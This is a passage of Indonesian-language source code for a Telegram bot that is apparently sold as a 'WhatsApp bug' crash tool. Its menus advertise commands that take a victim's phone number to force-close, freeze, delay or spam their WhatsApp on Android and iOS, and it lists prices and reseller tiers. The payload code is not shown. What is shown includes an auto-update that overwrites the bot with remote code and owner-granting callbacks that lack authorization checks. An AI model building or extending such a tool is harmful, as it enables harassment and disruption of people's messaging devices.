const requiredChannelFile = "requiredChannel.json";

function loadRequiredChannel() {
  if (fs.existsSync(requiredChannelFile)) {
    const data = JSON.parse(fs.readFileSync(requiredChannelFile));
    REQUIRED_CHANNEL_USERNAME = data.username;
  }
}
loadRequiredChannel();

function saveRequiredChannel() {
  fs.writeFileSync(
    requiredChannelFile,
    JSON.stringify({ username: REQUIRED_CHANNEL_USERNAME }, null, 2)
  );
}

async function isJoinedChannel(userId) {
  try {
    const member = await bot.telegram.getChatMember(
      REQUIRED_CHANNEL_USERNAME,
      userId
    );

    return (
      member.status === "member" ||
      member.status === "administrator" ||
      member.status === "creator"
    );
  } catch (err) {
    return false;
  }
}

async function sendForceSubscribeMessage(ctx) {
  const text = `
❌ Kamu belum join channel.
`;

  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "📢 Join Channel",
            url: `https://t.me/${REQUIRED_CHANNEL_USERNAME.replace("@", "")}`,
            style: "primary"
          },
        ],
        [
          {
            text: "🔄 Cek Status",
            callback_data: "check_join",
            style: "success"
          },
        ],
      ],
    },
  };

  if (ctx.callbackQuery) {
    return ctx.editMessageText(text, keyboard);
  } else {
    return ctx.reply(text, keyboard);
  }
}

//// ========== CALLBACK CHECK ==========
bot.action("check_join", async (ctx) => {
  const userId = ctx.from.id;

  const joined = await isJoinedChannel(userId);

  try {
    await ctx.deleteMessage();
  } catch {}

  if (!joined) {
    return ctx.reply("❌ Kamu belum join channel.");
  }

  await ctx.reply("✅ Verifikasi berhasil! Bot siap digunakan.");
  return sendPage(ctx, 0); 
});

//// ========== MIDDLEWARE  ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return;

  const text = ctx.message?.text || "";

  if (!text.startsWith("/start")) {
    return next();
  }

  const userId = ctx.from.id;
  const joined = await isJoinedChannel(userId);

  if (!joined) {
    return sendForceSubscribeMessage(ctx);
  }

  return next();
});

//// ========== SET CHANNEL COMMAND ==========
bot.command("setch", async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ Gunakan: /setch @ChannelLu");
  }

  let newChannel = args[1];
  if (!newChannel.startsWith("@")) newChannel = "@" + newChannel;

  REQUIRED_CHANNEL_USERNAME = newChannel;
  saveRequiredChannel();

  return ctx.reply(
    `✅ Channel diubah menjadi: ${REQUIRED_CHANNEL_USERNAME}
    𝘫𝘢𝘯𝘨𝘢𝘯 𝘭𝘶𝘱𝘢 𝘢𝘥𝘮𝘪𝘯𝘪𝘯 𝘥𝘪 𝘤𝘩 𝘭𝘶 𝘣𝘰𝘵 𝘯𝘺𝘢 𝘣𝘪𝘢𝘳 𝘬𝘦 𝘥𝘦𝘵𝘦𝘤𝘵 𝘶𝘴𝘦𝘳 𝘥𝘩 𝘫𝘰𝘪𝘯 𝘢𝘵𝘢𝘶 𝘣𝘦𝘭𝘰𝘮 𝘺𝘢𝘬𝘬!!`
  );
});

// ================= CONFIG =================
const IMAGES = {
  home: "https://files.catbox.moe/s55rn9.jpg"
};

// ================= EDIT MENU =================
async function editMenu(ctx, caption, keyboard) {
  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageMedia(
        {
          type: "photo",
          media: IMAGES.home,
          caption,
          parse_mode: "Markdown"
        },
        { reply_markup: { inline_keyboard: keyboard } }
      );
    } else {
      await ctx.replyWithPhoto(IMAGES.home, {
        caption,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } catch {
    await ctx.reply(caption, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    });
  }
}

// ================= SEND PAGE =================
async function sendPage(ctx, page = 0) {
  const total = pages.length;

  if (page < 0) page = 0;
  if (page >= total) page = total - 1;

  let keyboard = [];

  if (page === 0) {
    keyboard = [[
      {
        text: "(☊) 𝗨𝗡𝗟𝗢𝗖𝗞 χ-νуяℓєѕ 𝕮яαѕн",
        callback_data: `page_${page + 1}`,
        style: "success",
        icon_custom_emoji_id: "5372917041193828849"
      }
    ]];

  } else if (page === 1) {
    keyboard = [[
      { text: "「 𝘽𝘼𝘾𝙆 」", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" },
      { text: "⎙ 2/7", callback_data: "noop", style: "danger", icon_custom_emoji_id: "4956395910306202687" },
      { text: "(☊)「 𝙉𝙀𝙓𝙏 」", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "5372917041193828849" }
    ]];

  } else if (page === 2) {
    keyboard = [[
      { text: "「 𝘽𝘼𝘾𝙆 」", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" },
      { text: "⎙ 3/7", callback_data: "noop", style: "danger", icon_custom_emoji_id: "4956395910306202687" },
      { text: "(☊)「 𝙉𝙀𝙓𝙏 」", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "5372917041193828849" }
    ]];

  } else if (page === 3) {
    keyboard = [
      [{ text: "(⸙)「 ᴄᴀɴ sᴘᴀᴍ 」", callback_data: "spam", style: "success", icon_custom_emoji_id: "5084613633418199991" }, 
       { text: "(⸙)「 ɪɴᴠɪs ɴᴏᴛ sᴘᴀᴍ 」", callback_data: "invis", style: "success", icon_custom_emoji_id: "5084613633418199991" }],
      [{ text: "(⎚)「 ɴᴏᴛ sᴘᴀᴍ 」", callback_data: "not_spam", style: "danger", icon_custom_emoji_id: "5085022089103016925" }],
      [
        { text: "「 𝘽𝘼𝘾𝙆 」", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" },
        { text: "⎙ 4/7", callback_data: "noop", style: "danger", icon_custom_emoji_id: "4956395910306202687" },
        { text: "(☊)「 𝙉𝙀𝙓𝙏 」", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "5372917041193828849" }
      ]
    ];

  } else {
    const nav = [];

    if (page > 0) nav.push({ text: "「 𝘽𝘼𝘾𝙆 」", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" });
    nav.push({ text: `⎙ ${page + 1}/${total}`, callback_data: "noop", style: "danger", icon_custom_emoji_id: "4956395910306202687" });
    if (page < total - 1) nav.push({ text: "(☊)「 𝙉𝙀𝙓𝙏 」", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "5372917041193828849" });

    keyboard = [nav];
  }

  return editMenu(ctx, pages[page], keyboard); 
}

// ================= HANDLER =================
bot.action(/page_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  await sendPage(ctx, parseInt(ctx.match[1]));
});

bot.action("noop", async (ctx) => {
  await ctx.answerCbQuery();
});

// ================= START =================
bot.command("start", async (ctx) => {
  await sendPage(ctx, 0);
});
// ================= DATA PAGE =================
const pages = [
` \`\`\`js

𝘚𝘤𝘳𝘪𝘱𝘵 𝘣𝘶𝘨 𝘸𝘢 
𝘣𝘦𝘳𝘬𝘶𝘢𝘭𝘪𝘵𝘢𝘴 • 𝘱𝘳𝘦𝘮𝘪𝘶𝘮 𝘧𝘦𝘢𝘵𝘶𝘳𝘦  • 𝘩𝘪𝘨𝘩 𝘦𝘧𝘧𝘦𝘤𝘵
𝘸𝘢𝘭𝘢𝘶𝘱𝘶𝘯 𝘮𝘶𝘳𝘢𝘩 𝘬𝘶𝘢𝘭𝘪𝘵𝘢𝘯 𝘢𝘯𝘵𝘪 𝘮𝘶𝘳𝘢𝘩𝘢𝘯

━━━━━━━━━━━━━━━━━━
𝗦𝗞𝗜𝗟𝗦 𝗘𝗙𝗙𝗘𝗖𝗧 :
⌑ Delay Spam
⌑ Bulldozer X Delay
⌑ Blank Andro
⌑ Dan lain lain
━━━━━━━━━━━━━━━━━━
𝗣𝗥𝗜𝗖𝗘 𝗦𝗖𝗥𝗜𝗣𝗧
Full Update : 10,000
Reseller     : 15,000
━━━━━━━━━━━━━━━━━━
Developer Script: @fikayaw
━━━━━━━━━━━━━━━━━━

× CLICK BUTTON DI BAWAH UNTUK
MENDAPATKAN MENU TAMPILAN UTAMA
PADA SCRIPT INI !
\`\`\`
`,

` \`\`\`js

☇┊χ-νуяℓєѕ 𝕮яαѕн         
━━━━━━━━━━━━━━⪼
┏━⪼ ɪɴғᴏʀᴍᴀᴛɪᴏɴ χ-νуяℓєѕ 𝕮яαѕн
┊々 Developer  : @fikayaw
┊々 System     : Buy Only
┊々 Version    : 1.0
┊々 Access     : Premium Verified
┊々 Protection : ACTIVE
┗━━━━━━━━━━━━━━━━━━━━━━━━⪼
┏━⪼ ʙᴇsᴛ sᴜᴘᴘᴏʀᴛ
┊☇ ALLAH
┊☇ MY ORTU
┊☇ MY FRIEND
┊☇ MY PARTNER 
┊☇ MY HATERS
┗━━━━━━━━━━━━━━━━━━━━━⪼
━━━━━━━━━━━━━━━━━━━━━━━⪼
ᴛᴀᴘ ᴛʜᴇ ɴᴇxᴛ ʙᴜᴛᴛᴏɴ ᴄᴏɴᴛɪɴᴜᴇ →
━━━━━━━━━━━━━━━━━━━━━━━⪼
\`\`\`
`,

` \`\`\`js
☇━━━━━━━━━━━━━━☇
   UPDATE 
☇━━━━━━━━━━━━━━☇
➤ /checkupdate → Check Update
➤ /update ⇢ Update Otomatis
☇━━━━━━━━━━━━━━☇
⌑ ɢʀᴏᴜᴘ ᴍᴏᴅᴇ
☇━━━━━━━━━━━━━━☇
➤ /addpremgrup → Add Group
➤ /delpremgrup → Del Group
➤ /groupon → ON
➤ /groupoff → OFF
☇━━━━━━━━━━━━━━☇
⌑ ᴀᴄᴄᴇss ᴄᴏɴᴛʀᴏʟ
☇━━━━━━━━━━━━━━☇
➤ /list → User list acces
➤ /addowner → add owner
➤ /delowner → delete owner
➤ /addadmin → add admin
➤ /deladmin → delete admin
➤ /addprem → add premium
➤ /delprem → delete premium
☇━━━━━━━━━━━━━━☇
⌑ sǫᴜʀɪᴛʏ sʏsᴛᴇᴍ
☇━━━━━━━━━━━━━━☇
➤ /anticulik → Anti culik bot
➤ /addsafe → addsafe
➤ /antifoto → block foto
➤ /delsafe → off safe
➤ /antivideo → block video
➤ /antilink → Anti Link Gb
☇━━━━━━━━━━━━━━☇
⚒ sʏsᴛᴇᴍ ɪɴғᴏ
☇━━━━━━━━━━━━━━☇
➤ /cekbot → Check Uptime
➤ /setcd → Set Cooldown command
➤ /self → private bot
➤ /public → public bot
➤ /cekfunction → Error check function
➤ /testfunction →Test Function 
➤ /infopanel  → Check Info Panel
☇━━━━━━━━━━━━━━☇════

Security Script : ACTIVE
\`\`\`
`,

` \`\`\`js
━━━━━━━━━━━━━━━━━━━━━━━
   ⌑ ʙᴜɢ ᴄᴀᴛᴛᴀɢᴏʀɪᴇs ᴍᴇɴᴜ
━━━━━━━━━━━━━━━━━━━━━━━

Silahkan pilih jenis kategori bug
yang ingin kamu gunakan.

━━━━━━━━━━━━━━━━━━━━━━━
Powerful • High Performance
Full Feature • Premium Script
━━━━━━━━━━━━━━━━━━━━━━━
-「 ᴄᴀɴ sᴘᴀᴍ 」-
➤ Dapat digunakan untuk spam
➤ Mode Invisible (tidak terlihat)

-「 ɪɴᴠɪsɪʙʟᴇ ɴᴏᴛ sᴘᴀᴍ 」-
➤ Tidak untuk spam
➤ Mode Invisible (tidak terlihat)
➤ Walaupun Invisible Tidak Untuk Spam

-「 ɴᴏᴛ sᴘᴀᴍ 」-
➤ Tidak untuk spam
➤ Mode Visible (terlihat normal)

Security Script : ACTIVE
\`\`\`
`,

` \`\`\`js
☇━━━━━━━━━━━━━━☇
⚙ ᴍᴀɪɴ sᴇᴛᴛɪɴɢs
☇━━━━━━━━━━━━━━☇
(⌑) /setch ⇢ Set Channel
(⌑) /runtime ⇢ Check Runtime
(⌑) /mode ⇢ Mode
(⌑) /cekowner ⇢ Check Owner
☇━━━━━━━━━━━━━━☇
⚙ sᴇᴛᴛɪɴɢs ᴄᴍᴅ
☇━━━━━━━━━━━━━━☇
(⌑) /offcmd ⇢ Block Cmd
(⌑) /oncmd ⇢ Unblock Cmd
(⌑) /offcmdlist ⇢ List Block Cmd
(⌑) /lockallcmd ⇢ Lock All Cmd
(⌑) /unlockallcmd ⇢ Unlock All Cmd
☇━━━━━━━━━━━━━━☇
⚒ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ sᴇᴛᴛɪɴɢs
☇━━━━━━━━━━━━━━☇
(⌑) /connect ⇢ Connect Sender
(⌑) /killsesi ⇢ Delete Session
(⌑) /restart ⇢ Restart Panel
(⌑) /SpamPairing → Spam Pairing
━━━━━━━━━━━━━━━━━━━━━━━━━━

Security Script : ACTIVE
\`\`\`
`,

` \`\`\`js
╔═☇〔 ᴛᴏᴏʟs ᴍᴇɴᴜ 〕☇═╗

 ᴍᴇᴅɪᴀ & ᴄᴏɴᴠᴇʀᴛ
╔═══════════════
║⌑ /brat ⇢ Brat Text Maker
║⌑ /catbox ⇢ Catbox → Foto
║⌑ /catboxurl ⇢ Foto → Catbox
║⌑ /convert ⇢ Convert Media
║⌑ /hd ⇢ HD Enhancer
╚═════════════════════════

 ᴅᴏᴡɴʟᴏᴀᴅᴇʀ
╔═══════════════
║⌑ /tiktokdl ⇢ Download TikTok
║⌑ /snack ⇢ Download SnackVideo
╚═════════════════════════

 ʜᴀᴠᴇ ғᴜɴ
╔═══════════════
║⌑ /cekmasadepan ⇢ Ramalan Random
║⌑ /cuaca ⇢ Cek Cuaca
║⌑ /time ⇢ Waktu Indonesia
║⌑ /iqc ⇢ SS iPhone Theme
║⌑ /decjs ⇢ Encrypt JS
║⌑ /harga ⇢ Harga Script
╚══════════════════════════

Security Script : ACTIVE
\`\`\`
`,

` \`\`\`js
╭━━━〔 🌑 ʙᴇsᴛ sᴜᴘᴘᴏʀᴛ 🌑 〕━━━╮

┌─「 ᴄᴏʀᴇ sᴜᴘᴘᴏʀᴛ 」
│ ☇ @Allah         ➤ Endless Blessing
│ ☇ @Ortu         ➤ Real Life Backbone
└────────────────────

┌─「 ᴛᴇᴀᴍ 」
│☇ ғɪᴋᴀᴄʜᴜ [ 𝙳𝙴𝚅 𝙹𝙸𝚁 ]
┃    [ 𝙱𝙴𝚂𝚃𝙵𝚁𝙸𝙴𝙽𝙳 ]
└────────────────────

┌─「 sᴘᴇsɪᴀʟ ᴛʜᴀɴᴋs 」
│ ☇ Semua Member χ-νуяℓєѕ 𝕮яαѕн
│ ☇ All Hatters & Pembenci
└────────────────────

╰━━━〔 χ-νуяℓєѕ 𝕮яαѕн NEVER DIE 〕━━━╯

Security Script : ACTIVE
\`\`\`
`,
];

// ================= BUG INVISIBLE NO SPAM =================
bot.action("invis", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`js
╭──〔 𝙄𝙉𝙑𝙄𝙎 𝙉𝙊 𝙎𝙋𝘼𝙈 〕──╮
│ ↯ /Yokskurt  62xx      ⇢ DELAY X FORCE 
│ ↯ /DarkForce  62xx    ⇢ FORCLOSE ANDRO NO SPAM 
╰──────────────────────╯

Security Script : ACTIVE
\`\`\`
`, [[{ text: "「 ʙᴀᴄᴋ 」", callback_data: "page_3", style: "success", icon_custom_emoji_id: "5352759161945867747" }]]);
});

// ================= DELAY BEBAS SPAM BUG V1 =================
bot.action("spam", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`js
╭──〔 𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 〕─────╮
│ ↯ /Delayspam 62××      ⇢ DELAY HIT SPAM
│ ↯ /zdelay 62××        ⇢ BUG DELAY X BULDO
│ ↯ /IosCrsFc  62xx   ⇢ FORCLOSE SPAM IOS
╰──────────────────────

Security Script : ACTIVE
\`\`\`
`, [[{ text: "「 ʙᴀᴄᴋ 」", callback_data: "page_3", style: "success", icon_custom_emoji_id: "5352759161945867747" }]]);
});
// ================= BUG VISIBLE =================
bot.action("not_spam", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`js
╭──〔 𝗡𝗢𝗧 𝗦𝗣𝗔𝗠 𝗕𝗨𝗚 𝗧𝗬𝗣𝗘 〕──╮
│ ↯ /ForceClick  62xx    ⇢ FORCLOSE CLICK
│ ↯ /freeze 62××       ⇢ FREEZE CHAT
│ ↯ /BlankClick       ⇢ BLANK CLICK
│ ↯ /delaygroup     ⇢  DELAY GROUP
└────────────────────────

Security Script : ACTIVE
\`\`\`
`, [[{ text: "「 𝘽𝘼𝘾𝙆 」", callback_data: "page_3", style: "primary", icon_custom_emoji_id: "5352759161945867747" }]]);
});
// ================= BUG VISIBLE =================
bot.action("bug_ios", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`js
╔════☇〔 𝗜𝗢𝗦 𝗩𝗜𝗦𝗜𝗕𝗟𝗘 𝗕𝗨𝗚 𝗧𝗬𝗣𝗘 〕☇════╗
⌑ /fcios             ➤ "Forceclsoe iOS v1"
⌑ /iosForceclose    ➤ "Force Close iOS v2"
╚══════════════════════════════╝
\`\`\`
`, [[{ text: "「 𝘽𝘼𝘾𝙆 」", callback_data: "page_3", style: "primary", icon_custom_emoji_id: "5352759161945867747" }]]);
});
// ================= NAVIGATION =================
bot.action(/page_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
  sendPage(ctx, parseInt(ctx.match[1]));
});

// ================= START =================
bot.start(async (ctx) => {
  sendPage(ctx, 0);
});
//------------------(CHECK - UPDATE SYSTEM)--------------------//
function normalize(str) {
  return String(str).replace(/\r/g, "").trim();
}

function fetchRemote(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = "";

      if (res.statusCode !== 200) {
        return reject(new Error("HTTP_" + res.statusCode));
      }

      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve(data));
    }).on("error", reject);
  });
}

///update
const filePath = path.resolve(__dirname, "index.js");
const repoRaw = "https://raw.githubusercontent.com/febrisaputrahm-create/XVYRLES-/refs/heads/main/index.js";

bot.command('update', checkOwner, async (ctx) => {
  ctx.reply("⏳ Sedang mengecek update...");

  const { data } = await axios.get(repoRaw, {
    timeout: 10000
  });

  if (!data) {
    return ctx.reply("❌ Update gagal: File kosong!");
  }

  let backupPath = null;

  if (fs.existsSync(filePath)) {
    let i = 1;
    do {
      backupPath = `${filePath}.backup.${i}`;
      i++;
    } while (fs.existsSync(backupPath));

    fs.copyFileSync(filePath, backupPath);
  }

  fs.writeFileSync(filePath, data);

  ctx.reply(
    `✅ Update berhasil!\n📁 Backup dibuat: ${backupPath}\n🔄 Bot akan restart...`
  );

  setTimeout(() => process.exit(), 2000);
});

bot.command("checkupdate", async (ctx) => checkUpdate(ctx));

async function checkUpdate(ctx) {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Khusus owner!");
  }

  const msg = await ctx.reply("🔍 Initializing update check...");

  try {
    // 🔄 loading system
    const steps = [
      "🛰 Contacting github...",
      "📦 Connected successfully...",
      "📥 Extracting the index.js file...",
      "⚙️ Found and searching for the latest version...",
      "🔐 the system successfully detected..."
    ];

    for (const step of steps) {
      await sleep(300);
      await ctx.telegram.editMessageText(
        msg.chat.id,
        msg.message_id,
        undefined,
        `⏳ <b>CHECKING UPDATE</b>\n\n${step}`,
        { parse_mode: "HTML" }
      );
    }

    const remote = await fetchRemote(
  "https://raw.githubusercontent.com/febrisaputrahm-create/XVYRLES-/refs/heads/main/index.js"
);

    const local = fs.readFileSync("./index.js", "utf8");

    const same = normalize(remote) === normalize(local);

    if (same) {
      return ctx.telegram.editMessageText(
        msg.chat.id,
        msg.message_id,
        undefined,
        `📌 <b>SYSTEM STATUS</b>

━━━━━━━━━━━━━━━━━━
🟢 STATUS : UP TO DATE
🔒 VERSION : LATEST BUILD
⚡ ENGINE : STABLE
━━━━━━━━━━━━━━━━━━

Tidak ada update terbaru yang di temukan oleh system.`,
        { parse_mode: "HTML" }
      );
    }

    return ctx.telegram.editMessageText(
      msg.chat.id,
      msg.message_id,
      undefined,
      `🚨 <b>UPDATE DETECTED</b>

━━━━━━━━━━━━━━━━━━
♻️ STATUS : NEW VERSION SCRIPT
⚡ SOURCE : GitHub Raw
📦 SYSTEM : OUTDATED
📂 FILE     : index.js
━━━━━━━━━━━━━━━━━━

💡 Update tersedia, segera jalankan /update. Untuk mendapatkan versi terbaru dan agar Script menjadi stabil • high • premium

━━━━━━━━━━━━━━━━━━
χ-νуяℓєѕ 𝕮яαѕн DETECTED SYSTEM ACTIVE`,
      { parse_mode: "HTML" }
    );

  } catch (e) {
    return ctx.telegram.editMessageText(
      msg.chat.id,
      msg.message_id,
      undefined,
      `❌ <b>FAILED CHECK UPDATE</b>\n\n<code>${e.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});


bot.command("delpremgrup", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});

// ========== COMMAND /addowner (BUTTON CONFIRM) ==========
bot.command("addowner", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 ☊
━━━━━━━━━━━━━━━━
⸙ 𝙧𝙚𝙥𝙡𝙖𝙮 𝙥𝙚𝙨𝙖𝙣 𝙪𝙨𝙚𝙧 𝙙𝙚𝙣𝙜𝙖𝙣 /𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧
⸙ 𝙠𝙚𝙩𝙞𝙠 /𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧 11625282992 / 𝙞𝙙 𝙪𝙨𝙚𝙧 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧...
\`\`\`
`
    );
  }

  if (ownerUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙎𝙔𝙎𝙏𝙀𝙈 ߷
━━━━━━━━━━━━
⸙ 𝙨𝙪𝙙𝙖𝙝 𝙢𝙚𝙣𝙟𝙖𝙙𝙞 𝙤𝙬𝙣𝙚𝙧 𝙢𝙚𝙠𝙞...
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Kirim konfirmasi tombol
  await ctx.reply(
`
\`\`\`js
𝙎𝙔𝙎𝙏𝙀𝙈 - 𝘾𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⸙
━━━━━━━━━━━━━━━━━━
⸙ 𝙖𝙥𝙖𝙠𝙖𝙝 𝙖𝙣𝙙𝙖 𝙮𝙖𝙠𝙞𝙣 𝙞𝙣𝙜𝙞𝙣 𝙢𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙪𝙨𝙚𝙧 𝙢𝙚𝙣𝙟𝙖𝙙𝙞 𝙊𝙒𝙉𝙀𝙍 ?
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ YES", callback_data: `confirm_addowner_${targetUserId}`, style: "success" },
            { text: "❌ NO", callback_data: `cancel_addowner`, style: "primary" }
          ]
        ]
      }
    }
  );
});


// ========== BUTTON YES ==========
bot.action(/confirm_addowner_(.+)/, async (ctx) => {
  const targetUserId = ctx.match[1];

  if (ownerUsers.includes(targetUserId)) {
    return ctx.answerCbQuery("Sudah jadi owner ❗");
  }

  ownerUsers.push(targetUserId);
  saveJSON(ownerFile, ownerUsers);

  await ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔  ᣲ
━━━━━━━━━━━━━━━━━━━━━━━━
⸙ 𝙤𝙬𝙣𝙚𝙧 𝙨𝙪𝙘𝙘𝙚𝙨 𝙙𝙞 𝙩𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
⸙ 𝙖𝙘𝙘𝙚𝙨 𝙡𝙚𝙗𝙞𝙝 𝙖𝙠𝙖𝙣 𝙙𝙞 𝙗𝙚𝙧𝙞𝙠𝙖𝙣 ⎙
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("𝘼𝙡𝙡 𝘾𝙤𝙣𝙛𝙞𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮⎌");
});


// ========== BUTTON NO ==========
bot.action("cancel_addowner", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙀𝙍𝙍𝙊𝙍
━━━━━━━━━━━
⸙ 𝙥𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙖𝙣 𝙤𝙬𝙣𝙚𝙧 𝙖𝙘𝙘𝙚𝙨 𝙙𝙞 𝙗𝙖𝙩𝙖𝙡𝙠𝙖𝙣 ⎋
⸙ 𝙮𝙖𝙝𝙖𝙝𝙖 𝙢𝙖𝙢𝙥𝙪𝙨 𝙜𝙖𝙟𝙖𝙙𝙞 𝙙𝙞 𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧 𝙠𝙞𝙬...
\`\`\`
`,
  { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("𝘾𝙖𝙣𝙣𝙘𝙚𝙡𝙚𝙙 𝘼𝙡𝙡 𝘾𝙤𝙣𝙛𝙞𝙧𝙢𝙖𝙩𝙞𝙤𝙣 ⍨");
});
// ========== COMMAND /delowner (ITALIC STYLE) ==========
bot.command("delowner", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 ☊
━━━━━━━━━━━━━━━━
⸙ 𝙧𝙚𝙥𝙡𝙮 𝙥𝙚𝙨𝙖𝙣 𝙪𝙨𝙚𝙧 𝙙𝙚𝙣𝙜𝙖𝙣 /delowner
⸙ 𝙠𝙚𝙩𝙞𝙠 /delowner 123456789
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  if (!ownerUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙎𝙔𝙎𝙏𝙀𝙈 ߷
━━━━━━━━━━━━
⸙ 𝙪𝙨𝙚𝙧 𝙗𝙪𝙠𝙖𝙣 𝙤𝙬𝙣𝙚𝙧
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // KONFIRMASI
  await ctx.reply(
`
\`\`\`js
𝙎𝙔𝙎𝙏𝙀𝙈 - 𝘾𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⸙
━━━━━━━━━━━━━━━━━━
⸙ 𝙮𝙖𝙠𝙞𝙣 𝙞𝙣𝙜𝙞𝙣 𝙢𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝙤𝙬𝙣𝙚𝙧 ?
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ YES", callback_data: `confirm_delowner_${targetUserId}` },
            { text: "❌ NO", callback_data: `cancel_delowner` }
          ]
        ]
      }
    }
  );
});


// ========== YES ==========
bot.action(/confirm_delowner_(.+)/, async (ctx) => {
  const targetUserId = ctx.match[1];

  if (!ownerUsers.includes(targetUserId)) {
    return ctx.answerCbQuery("Bukan owner ❗");
  }

  ownerUsers = ownerUsers.filter(id => id !== targetUserId);
  saveJSON(ownerFile, ownerUsers);

  await ctx.editMessageText(
`
\`\`\`js
